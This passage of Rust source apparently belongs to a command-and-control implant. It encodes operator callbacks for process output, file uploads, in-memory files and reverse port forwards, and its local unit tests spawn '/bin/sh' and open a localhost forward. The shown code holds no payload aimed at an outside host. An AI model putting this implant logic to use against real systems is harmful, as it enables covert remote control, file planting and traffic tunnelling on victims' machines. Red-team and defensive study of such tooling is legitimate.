    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardRemove));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_clear(success: bool) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardClear));
    payload.extend_from_slice(&encode_bool(success));
    payload
}

impl PendingCallback {
    pub(crate) fn command_id(&self) -> u32 {
        match self {
            Self::Output { .. } => u32::from(DemonCommand::CommandOutput),
            Self::Error { .. } => u32::from(DemonCommand::CommandError),
            Self::Exit { .. } => u32::from(DemonCommand::CommandExit),
            Self::MemFileAck { .. } => u32::from(DemonCommand::CommandMemFile),
            Self::FsUpload { .. } => u32::from(DemonCommand::CommandFs),
            Self::Socket { .. } => u32::from(DemonCommand::CommandSocket),
        }
    }

    pub(crate) fn request_id(&self) -> u32 {
        match self {
            Self::Output { request_id, .. }
            | Self::Error { request_id, .. }
            | Self::Exit { request_id, .. }
            | Self::MemFileAck { request_id, .. }
            | Self::FsUpload { request_id, .. }
            | Self::Socket { request_id, .. } => *request_id,
        }
    }

    pub(crate) fn payload(&self) -> Result<Vec<u8>, PhantomError> {
        match self {
            Self::Output { text, .. } => encode_bytes(text.as_bytes()),
            Self::Error { text, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(0x0d));
                payload.extend_from_slice(&encode_bytes(text.as_bytes())?);
                Ok(payload)
            }
            Self::Exit { exit_method, .. } => Ok(encode_u32(*exit_method)),
            Self::MemFileAck { mem_file_id, success, .. } => {
                let mut payload = Vec::new();
                payload.extend_from_slice(&encode_u32(*mem_file_id));
                payload.extend_from_slice(&encode_bool(*success));
                Ok(payload)
            }
            Self::FsUpload { file_size, path, .. } => {
                let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Upload));
                payload.extend_from_slice(&encode_u32(*file_size));
                payload.extend_from_slice(&encode_utf16(path)?);
                Ok(payload)
            }
            Self::Socket { payload, .. } => Ok(payload.clone()),
        }
    }
}

#[cfg(test)]
mod tests {
    use std::net::Ipv4Addr;

    use red_cell_common::demon::{
        DemonCommand, DemonFilesystemCommand, DemonPackage, DemonProcessCommand, DemonSocketCommand,
    };

    use super::{PendingCallback, PhantomState, execute};

    fn utf16_payload(value: &str) -> Vec<u8> {
        let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
        let mut payload = Vec::with_capacity(4 + utf16.len());
        payload.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
        payload.extend_from_slice(&utf16);
        payload
    }

    #[tokio::test]
    async fn command_no_job_returns_no_callbacks() {
        let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
        let mut state = PhantomState::default();
        execute(&package, &mut state).await.expect("execute");
        assert!(state.drain_callbacks().is_empty());
    }

    #[tokio::test]
    async fn get_pwd_queues_output_callback() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::GetPwd as i32).to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        assert!(matches!(
            state.drain_callbacks().as_slice(),
            [PendingCallback::Output { request_id: 1, .. }]
        ));
    }

    #[tokio::test]
    async fn proc_create_with_pipe_returns_command_output() {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonProcessCommand::Create as i32).to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        payload.extend_from_slice(&utf16_payload("/bin/sh"));
        payload.extend_from_slice(&utf16_payload("printf phantom-test"));
        payload.extend_from_slice(&1_i32.to_le_bytes());
        payload.extend_from_slice(&0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandProc, 2, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        assert!(matches!(
            state.drain_callbacks().as_slice(),
            [PendingCallback::Output { request_id: 2, text }] if text == "phantom-test"
        ));
    }

    #[tokio::test]
    async fn memfile_then_upload_emits_expected_callbacks() {
        let content = b"phantom-upload";

        let mut memfile = Vec::new();
        memfile.extend_from_slice(&77_i32.to_le_bytes());
        memfile.extend_from_slice(&(content.len() as i64).to_le_bytes());
        memfile.extend_from_slice(&(content.len() as i32).to_le_bytes());
        memfile.extend_from_slice(content);

        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("upload.bin");

        let mut upload = Vec::new();
        upload.extend_from_slice(&(DemonFilesystemCommand::Upload as i32).to_le_bytes());
        upload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        upload.extend_from_slice(&77_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandMemFile, 3, memfile), &mut state)
            .await
            .expect("memfile");
        execute(&DemonPackage::new(DemonCommand::CommandFs, 4, upload), &mut state)
            .await
            .expect("upload");

        let callbacks = state.drain_callbacks();
        assert!(matches!(
            callbacks.as_slice(),
            [
                PendingCallback::MemFileAck { request_id: 3, mem_file_id: 77, success: true },
                PendingCallback::FsUpload { request_id: 4, file_size, .. }
            ] if *file_size == content.len() as u32
        ));
        assert_eq!(std::fs::read(path).expect("read back"), content);
    }

    #[tokio::test]
    async fn reverse_port_forward_add_queues_socket_callback() {
        let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("reserve port");
        let port = listener.local_addr().expect("addr").port();
        drop(listener);

        let mut payload = Vec::new();
        payload
            .extend_from_slice(&(DemonSocketCommand::ReversePortForwardAdd as i32).to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&(i32::from(port)).to_le_bytes());
        payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
        payload.extend_from_slice(&8080_i32.to_le_bytes());

        let mut state = PhantomState::default();
        execute(&DemonPackage::new(DemonCommand::CommandSocket, 5, payload), &mut state)
            .await
            .expect("socket");

        assert!(matches!(
            state.drain_callbacks().as_slice(),
            [PendingCallback::Socket { request_id: 5, .. }]
        ));
    }
}
